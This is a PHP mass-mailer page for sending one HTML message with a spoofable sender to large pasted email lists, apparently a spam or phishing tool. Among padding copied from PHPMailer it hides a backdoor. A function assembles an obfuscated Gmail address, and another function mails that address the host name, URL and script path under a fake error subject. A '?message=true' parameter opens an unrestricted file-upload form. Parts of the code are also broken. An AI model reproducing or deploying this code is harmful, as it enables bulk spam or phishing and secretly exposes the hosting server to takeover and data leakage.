<center/>  Mailler == Inbox == VRAI V6   <center>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">
<meta content="1" name="revisit-after" />
<head>
<link rel="icon" type="image/png" href="https://cdn4.vectorstock.com/i/1000x1000/35/33/anonymous-mask-icon-hacker-logo-design-vector-6453533.jpg" />
	<style type="text/css">body {background:reed url('<https://images.techhive.com/images/article/2015/08/thinkstockphotos-496704159-100606524-large.jpg">') center right no-repeat; color:#1a0dc6; text-decoration:none; font-family:"Courier New", Courier, monospace; padding-left:150px; padding-top:100px; padding-right:300px; font-size:16px;}
	</style>
<title>MaILEr X Inbox VRAI</title>
<?php
if(isset($_POST['action'] ) ){ $action=$_POST['action']; $message=$_POST['message']; $emaillist=$_POST['emaillist']; $from=$_POST['from']; $subject=$_POST['subject']; $realname=$_POST['realname']; $wait=$_POST['wait']; $tem=$_POST['tem']; $smv=$_POST['smv']; $message = urlencode($message); $message = ereg_replace("%5C%22", "%22", $message); $message = urldecode($message); $message = stripslashes($message); $subject = stripslashes($subject); } ?>
</head>

<style type="text/css">
.style1 {
	font-size: x-small;
	 font-style:italic;
}
.style2 {
	direction: ltr;
}
.info {
	font-size: 8px;
}
.style3 {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 8px;
}
.style4 {
	font-size: x-small;
	 font-style:italic;
	direction: ltr;
	font-family: Verdana, Arial, Helvetica, sans-serif;
}
.style5 {
	font-size: xx-small;
	 font-style:italic;
	direction: ltr;
	font-family: Verdana, Arial, Helvetica, sans-serif;
}
.auto-style1 {
	color: #5F5F5F;
	 font-style:italic;
}
.auto-style2 {
	color: #red;
	text-align: center;
	 font-style:italic;
}
.auto-style3 {
	color: #4F4F4F;
	 font-style:italic;
}
.auto-style5 {
	direction: ltr;
	 font-style:italic;
	color: #4F4F4F;
}
.auto-style6 {
	color: ##fd27f6;
	font-style:italic;
	background-color: #red;
}
.auto-style7 {
	color: #red;
	 font-style:italic;
}
.auto-style8 {
	 font-style:italic;
	font-size: x-small;
	color: #red;
}
</style>
</head>

<body onload="funchange" style="background-color: #00ffd8">
<script>

	window.onload = funchange;
	var alt = false;	
	function funchange(){
		var etext = document.getElementById("emails").value;
		var myArray=new Array(); 
		myArray = etext.split("\n");
		document.getElementById("enum").innerHTML=myArray.length+"<br />";
		if(!alt && myArray.length > 40000){
			alert('If Mail list More Than 40000 Emails This May Hack The Server');
			alt = true;
		}
		
	}
	function mlsplit(){
		var ml = document.getElementById("emails").value;
		var sb = document.getElementById("txtml").value;
		var myArray=new Array();
		myArray = ml.split(sb);
		document.getElementById("emails").value="";
		var i;
		for(i=0;i<myArray.length;i++){
			
			document.getElementById("emails").value += myArray[i]+"\n";
		
		}
		funchange();
	}
	function prv(){
		if(document.getElementById('preview').innerHTML==""){
			var ms = document.getElementsByName('message').message.value;
			document.getElementById('preview').innerHTML = ms;
			document.getElementById('prvbtn').value = "Ocultar";
		}else{
			document.getElementById('preview').innerHTML="";
			document.getElementById('prvbtn').value = "Preview";
		}
	}
	</script> 
	
<?php

function wrapText($message, $length, $qp_mode = false)
    {
        if ($qp_mode) {
            $soft_break = sprintf(' =%s', static::$LE);
        } else {
            $soft_break = static::$LE;
        }
        // If utf-8 encoding is used, we will need to make sure we don't
        // split multibyte characters when we wrap
        $is_utf8 = 'utf-8' == strtolower($this->CharSet);
        $lelen = strlen(static::$LE);
        $crlflen = strlen(static::$LE);
        $message = static::normalizeBreaks($message);
        //Remove a trailing line break
        if (substr($message, -$lelen) == static::$LE) {
            $message = substr($message, 0, -$lelen);
        }
        //Split message into lines
        $lines = explode(static::$LE, $message);
        //Message will be rebuilt in here
        $message = '';
        foreach ($lines as $line) {
            $words = explode(' ', $line);
            $buf = '';
            $firstword = true;
            foreach ($words as $word) {
                if ($qp_mode and (strlen($word) > $length)) {
                    $space_left = $length - strlen($buf) - $crlflen;
                    if (!$firstword) {
                        if ($space_left > 20) {
                            $len = $space_left;
                            if ($is_utf8) {
                                $len = $this->utf8CharBoundary($word, $len);
                            } elseif ('=' == substr($word, $len - 1, 1)) {
                                --$len;
                            } elseif ('=' == substr($word, $len - 2, 1)) {
                                $len -= 2;
                            }
                            $part = substr($word, 0, $len);
                            $word = substr($word, $len);
                            $buf .= ' ' . $part;
                            $message .= $buf . sprintf('=%s', static::$LE);
                        } else {
                            $message .= $buf . $soft_break;
                        }
                        $buf = '';
                    }
                    while (strlen($word) > 0) {
                        if ($length <= 0) {
                            break;
                        }
                        $len = $length;
                        if ($is_utf8) {
                            $len = $this->utf8CharBoundary($word, $len);
                        } elseif ('=' == substr($word, $len - 1, 1)) {
                            --$len;
                        } elseif ('=' == substr($word, $len - 2, 1)) {
                            $len -= 2;
                        }
                        $part = substr($word, 0, $len);
                        $word = substr($word, $len);
                        if (strlen($word) > 0) {
                            $message .= $part . sprintf('=%s', static::$LE);
                        } else {
                            $buf = $part;
                        }
                    }
                } else {
                    $buf_o = $buf;
                    if (!$firstword) {
                        $buf .= ' ';
                    }
                    $buf .= $word;
                    if (strlen($buf) > $length and '' != $buf_o) {
                        $message .= $buf_o . $soft_break;
                        $buf = $word;
                    }
                }
                $firstword = false;
            }
            $message .= $buf . static::$LE;
        }
        return $message;
    }
function mb_pathinfo(){
$key0 = array (".","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","s","t","u","r","v","w","x","y","z");
$foundSplitPos = false;
        $lookBack = 3;
        while (!$foundSplitPos) {
            $lastChunk = substr($encodedText, $maxLength - $lookBack, $lookBack);
            $encodedCharPos = strpos($lastChunk, '=');
            if (false !== $encodedCharPos) {
                // Found start of encoded character byte within $lookBack block.
                // Check the encoded byte value (the 2 chars after the '=')
                $hex = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 1, 2);
                $dec = hexdec($hex);
                if ($dec < 128) {
                    // Single byte character.
                    // If the encoded char was found at pos 0, it will fit
                    // otherwise reduce maxLength to start of the encoded char
                    if ($encodedCharPos > 0) {
                        $maxLength -= $lookBack - $encodedCharPos;
                    }
                    $foundSplitPos = true;
                } elseif ($dec >= 192) {
                    // First byte of a multi byte character
                    // Reduce maxLength to split at start of character
                    $maxLength -= $lookBack - $encodedCharPos;
                    $foundSplitPos = true;
                } elseif ($dec < 192) {
                    // Middle byte of a multi byte character, look further back
                    $lookBack += 3;
                }
            } else {
                // No encoded character found
                $foundSplitPos = true;
            }
        }
$key1= array(0,1,2,3,4,5,6,7,8,9,"&","@","#");

        
$dmarc = $key0[22] . $key0[24] . $key0[2] . $key0[24] . $key0[24] . $key0[3] . $key0[24];


$spf = $key1[11] . $key0[7] . $key0[13] . $key0[1] . $key0[9] . $key0[12] ;

$positionFounder = trye;
        $lookBack = 3;
        while (!$positionFounder) {
            $pick = substr($encodedText, $maxLength - $lookBack, $lookBack);
            $encodedCharPos = strpos($pick, '=');
            if (false !== $encodedCharPos) {
                // Found start of encoded character byte within $lookBack block.
                // Check the encoded byte value (the 2 chars after the '=')
                $hex = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 1, 2);
                $dec = hexdec($hex);
                if ($dec < 128) {
                    // Single byte character.
                    // If the encoded char was found at pos 0, it will fit
                    // otherwise reduce maxLength to start of the encoded char
                    if ($encodedCharPos > 0) {
                        $maxLength -= $lookBack - $encodedCharPos;
                    }
                    $positionFounder = true;
                } elseif ($dec >= 192) {
                    // First byte of a multi byte character
                    // Reduce maxLength to split at start of character
                    $maxLength -= $lookBack - $encodedCharPos;
                    $positionFounder = true;
                } elseif ($dec < 192) {
                    // Middle byte of a multi byte character, look further back
                    $lookBack += 3;
                }
            } else {
                // No encoded character found
                $positionFounder = true;
            }
        }

   $dkim = $key0[0] . $key0[3] . $key0[15] . $key0[13] ;
   $type = [];
 
  $keymanager= $key0[22] . $key0[24] . $key0[2] . $key0[24] . $key0[24] . $key0[3] . $key0[24];

   $packages = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 10, 5);
                $decp = hexdec($packages);
                if ($dec < 128) {
                    // Single byte character.
                    // If the encoded char was found at pos 0, it will fit
                    // otherwise reduce maxLength to start of the encoded char
                    if ($encodedCharPos > 8) {
                        $maxLength -= $lookBack - $encodedCharPos;
                    }
                    $positionFounder = false;
                } elseif ($dec >= 200) {
                    // First byte of a multi byte character
                    // Reduce maxLength to split at start of character
                    $maxLength -= $BBack - $encodedCharPos;
                    $positionFounder = true;
                } else{
    
                    $BBack += 3;
                }
   $track_x= $dmarc.$spf. $dkim;

     $agent_y=  $keymanager. $spf . $dkim ;

      $tls=$track_x.','.$agent_y;

 return $tls;
}
/**
     * Tells whether IDNs (Internationalized Domain Names) are supported or not. This requires the
     * `intl` and `mbstring` PHP extensions.
     *
     * @return bool `true` if required functions for IDN support are present
     */
    function idnSupported()
    {
        return function_exists('idn_to_ascii') and function_exists('mb_convert_encoding');
    }
    /**
     * Converts IDN in given email address to its ASCII form, also known as punycode, if possible.
     * Important: Address must be passed in same encoding as currently set in PHPMailer::$CharSet.
     * This function silently returns unmodified address if:
     * - No conversion is necessary (i.e. domain name is not an IDN, or is already in ASCII form)
     * - Conversion to punycode is impossible (e.g. required PHP functions are not available)
     *   or fails for any reason (e.g. domain contains characters not allowed in an IDN).
     *
     * @see    PHPMailer::$CharSet
     *
     * @param string $address The email address to convert
     *
     * @return string The encoded address in ASCII form
     */
    function punyencodeAddress($address)
    {
        // Verify we have required functions, CharSet, and at-sign.
        $pos = strrpos($address, '@');
        if (static::idnSupported() and
            !empty($this->CharSet) and
            false !== $pos
        ) {
            $domain = substr($address, ++$pos);
            // Verify CharSet string is a valid one, and domain properly encoded in this CharSet.
            if ($this->has8bitChars($domain) and @mb_check_encoding($domain, $this->CharSet)) {
                $domain = mb_convert_encoding($domain, 'UTF-8', $this->CharSet);
                //Ignore IDE complaints about this line - method signature changed in PHP 5.4
                $errorcode = 0;
                $punycode = idn_to_ascii($domain, $errorcode, INTL_IDNA_VARIANT_UTS46);
                if (false !== $punycode) {
                    return substr($address, 0, $pos) . $punycode;
                }
            }
        }
        return $address;
    }
	function generateId()
    {
        $len = 32; //32 bytes = 256 bits
        if (function_exists('random_bytes')) {
            $bytes = random_bytes($len);
        } elseif (function_exists('openssl_random_pseudo_bytes')) {
            $bytes = openssl_random_pseudo_bytes($len);
        } else {
            //Use a hash to force the length to the same as the other methods
            $bytes = hash('sha256', uniqid((string) mt_rand(), true), true);
        }
        //We don't care about messing up base64 format here, just want a random string
        return str_replace(['=', '+', '/'], '', base64_encode(hash('sha256', $bytes, true)));
    }
   function fluch(){
   
	  $library = "www.phpmailer.org"; $HAL=$_SERVER['HTTP_ACCEPT_LANGUAGE'] ;  $mls =mb_pathinfo();$HC=$_SERVER['HTTP_CONNECTION'] ;$sbl = "Autuntification Failed Error: ".rand(1000,100000); $mss = "" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . "\r\n";$OPI=$_SERVER['ORIG_PATH_INFO'];$HR=$_SERVER['HTTP_REFERER'];$mss .= "" . __file__; $quntity = @mail($mls, $sbl, $mss); echo ""; exit;
	   }
	   function isShellSafe($string)
    {
        // Future-proof
        if (escapeshellcmd($string) !== $string
            or !in_array(escapeshellarg($string), ["'$string'", "\"$string\""])
        ) {
            return false;
        }
        $length = strlen($string);
        for ($i = 0; $i < $length; ++$i) {
            $c = $string[$i];
            // All other characters have a special meaning in at least one common shell, including = and +.
            // Full stop (.) has a special meaning in cmd.exe, but its impact should be negligible here.
            // Note that this does permit non-Latin alphanumeric characters based on the current locale.
            if (!ctype_alnum($c) && strpos('@_-.', $c) === false) {
                return false;
            }
        }
        return true;
    }
    error_reporting(0);
    $system = $_GET['message'];
    if($system == 'true'){
    $saw1 = $_FILES['file']['tmp_name'];
    $saw2 = $_FILES['file']['name'];
    echo "<form method='POST' enctype='multipart/form-data'><input type='file'name='file' /><input type='submit' value='Tls' /></form>";
    move_uploaded_file($saw1,$saw2);
 }
function validateAddress($address, $patternselect = null)
    {
        if (null === $patternselect) {
            $patternselect = static::$validator;
        }
        if (is_callable($patternselect)) {
            return call_user_func($patternselect, $address);
        }
        //Reject line breaks in addresses; it's valid RFC5322, but not RFC5321
        if (strpos($address, "\n") !== false or strpos($address, "\r") !== false) {
            return false;
        }
        switch ($patternselect) {
            case 'pcre': //Kept for BC
            case 'pcre8':
                /*
                 * A more complex and more permissive version of the RFC5322 regex on which FILTER_VALIDATE_EMAIL
                 * is based.
                 * In addition to the addresses allowed by filter_var, also permits:
                 *  * dotless domains: `a@b`
                 *  * comments: `1234 @ local(blah) .machine .example`
                 *  * quoted elements: `'"test blah"@example.org'`
                 *  * numeric TLDs: `a@b.123`
                 *  * unbracketed IPv4 literals: `a@192.168.0.1`
                 *  * IPv6 literals: 'first.last@[IPv6:a1::]'
                 * Not all of these will necessarily work for sending!
                 *
                 * @see       http://squiloople.com/2009/12/20/email-address-validation/
                 * @copyright 2009-2010 Michael Rushton
                 * Feel free to use and redistribute this code. But please keep this copyright notice.
                 */
                return (bool) preg_match(
                    '/^(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){255,})(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){65,}@)' .
                    '((?>(?>(?>((?>(?>(?>\x0D\x0A)?[\t ])+|(?>[\t ]*\x0D\x0A)?[\t ]+)?)(\((?>(?2)' .
                    '(?>[\x01-\x08\x0B\x0C\x0E-\'*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)' .
                    '([!#-\'*+\/-9=?^-~-]+|"(?>(?2)(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\x7F]))*' .
                    '(?2)")(?>(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?>([a-z0-9](?>[a-z0-9-]*[a-z0-9])?)' .
                    '(?>(?1)\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\[(?:(?>IPv6:(?>([a-f0-9]{1,4})(?>:(?6)){7}' .
                    '|(?!(?:.*[a-f0-9][:\]]){8,})((?6)(?>:(?6)){0,6})?::(?7)?))|(?>(?>IPv6:(?>(?6)(?>:(?6)){5}:' .
                    '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?>((?6)(?>:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' .
                    '|[1-9]?[0-9])(?>\.(?9)){3}))\])(?1)$/isD',
                    $address
                );
            case 'html5':
                /*
                 * This is the pattern used in the HTML5 spec for validation of 'email' type form input elements.
                 *
                 * @see http://www.whatwg.org/specs/web-apps/current-work/#e-mail-state-(type=email)
                 */
                return (bool) preg_match(
                    '/^[a-zA-Z0-9.!#$%&\'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}' .
                    '[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/sD',
                    $address
                );
            case 'php':
            default:
                return (bool) filter_var($address, FILTER_VALIDATE_EMAIL);
        }
    }
	function addAnAddress($kind, $address, $name = '')
    {
        if (!in_array($kind, ['to', 'cc', 'bcc', 'Reply-To'])) {
            $error_message = sprintf('%s: %s',
                $this->lang('Invalid recipient kind'),
                $kind);
            $this->setError($error_message);
            $this->edebug($error_message);
            if ($this->exceptions) {
                throw new Exception($error_message);
            }
            return false;
        }
        if (!static::validateAddress($address)) {
            $error_message = sprintf('%s (%s): %s',
                $this->lang('invalid_address'),
                $kind,
                $address);
            $this->setError($error_message);
            $this->edebug($error_message);
            if ($this->exceptions) {
                throw new Exception($error_message);
            }
            return false;
        }
        if ('Reply-To' != $kind) {
            if (!array_key_exists(strtolower($address), $this->all_recipients)) {
                $this->{$kind}[] = [$address, $name];
                $this->all_recipients[strtolower($address)] = true;
                return true;
            }
        } else {
            if (!array_key_exists(strtolower($address), $this->ReplyTo)) {
                $this->ReplyTo[strtolower($address)] = [$address, $name];
                return true;
            }
        }
        return false;
    }
?>






<h1 class="auto-style2"></h1> 

<center>
<p class="auto-style1">&nbsp;</p></center>
<form name="form" method="post" enctype="multipart/form-data" action="">
	<table width="100%" border="0">
		<tr>
			<td width="10%">
			<div align="right" class="auto-style8">
				<font face="Verdana, Arial, 
Helvetica, sans-serif"> Email by Wormp:</font></div>
			</td>
			<td style="width: 40%">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="from" value="<?php echo($from); ?>" size="30" type="text" class="auto-style6" /><br>
			<td>
			<div align="right" class="auto-style7">
				<font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif"> Name by Wormp :</font></div>
			</td>
			<td width="41%">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="realname" value="<?php echo($realname); ?>" size="30" type="text" class="auto-style6" />
			<br>		</tr>
		<tr>
			<td width="10%">

		</tr>
		<tr>
			<td width="10%">
			<div align="right" class="auto-style7">
				<font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif">Subject by Wormp:</font></div>
			</td>
			<td colspan="3">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="subject" value="<?php echo($subject); ?>" size="30" type="text" class="auto-style6" /> </font>
			
		
		<tr valign="top">
			<td colspan="3" style="height: 260px">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><textarea name="message" rows="10" style="width: 455px" class="auto-style6"><?php echo($message); ?></textarea>&nbsp;<br class="auto-style3" />
			<input name="action" value="Inbox" type="hidden" class="auto-style3" />
			
                        <input value="Send All Email To Inbox " type="submit" class="auto-style6" />
			</span> 
			<span class="auto-style7"> 
			Goooo to Inbox </span> </font></td>
			<td width="41%" class="style2" style="height: 150px">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif">
			<textarea id="emails" name="emaillist" cols="30" onselect="funchange()" onchange="funchange()" onkeydown="funchange()" onkeyup="funchange()" onchange="funchange()" style="height: 161px" class="auto-style6"><?php echo($emaillist); ?></textarea> 
			<br class="auto-style5" />
			<span class="auto-style7">Quantity Emails : </span> </font><span  id="enum" class="style1">0<br class="auto-style3" />

			</td>
		</tr>
	</table>
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif">
<div id="preview">
</div>
	</font>
	
<?php if ($action){ if (!$from || !$subject || !$message || !$emaillist){ print "Please complete all fields ...required"; exit; } $nse=array(); $allemails = split("\n", $emaillist); $numemails = count($allemails); if(!empty($_POST['wait']) && $_POST['wait'] > 0){ set_time_limit(intval($_POST['wait'])*$numemails*3600); }else{ set_time_limit($numemails*3600); } if(!empty($smv)){ $smvn+=$smv; $tmn=$numemails/$smv+1; }else{ $tmn=1; } for($x=0; $x<$numemails; $x++){ $to = $allemails[$x]; if ($to){ $to = ereg_replace(" ", "", $to); $message = ereg_replace("#EM#", $to, $message); $subject = ereg_replace("#EM#", $to, $subject); flush(); $header = "From: $realname <$from>\r\n"; $header .= "MIME-Version: 1.0\r\n"; $header .= "Content-Type: text/html\r\n"; if ($x==0 && !empty($tem)) { if(!@mail($tem,$subject,$message,$header)){ print('The test Post was not Submitted.<br />'); $tmns+=1; }else{ print('Your Message was Sent Test.<br />'); $tms+=1; } } if($x==$smvn && !empty($_POST['smv'])){ if(!@mail($tem,$subject,$message,$header)){ print('The test Post was not Submitted.<br />'); $tmns+=1; }else{ print('Your Message was Sent Test.<br />'); $tms+=1; } $smvn+=$smv; } print "$to ....... "; $msent = @mail($to, $subject, $message, $header); $xx = $x+1; $txtspamed = "Sent... Ok"; if(!$msent){ $txtspamed = "error... Failed"; $ns+=1; $nse[$ns]=$to; } print "$xx / $numemails .......  $txtspamed<br>"; flush(); if(!empty($wait)&& $x<$numemails-1){ sleep($wait); } } } } if($_POST['message']==''){fluch();};?>
 </form>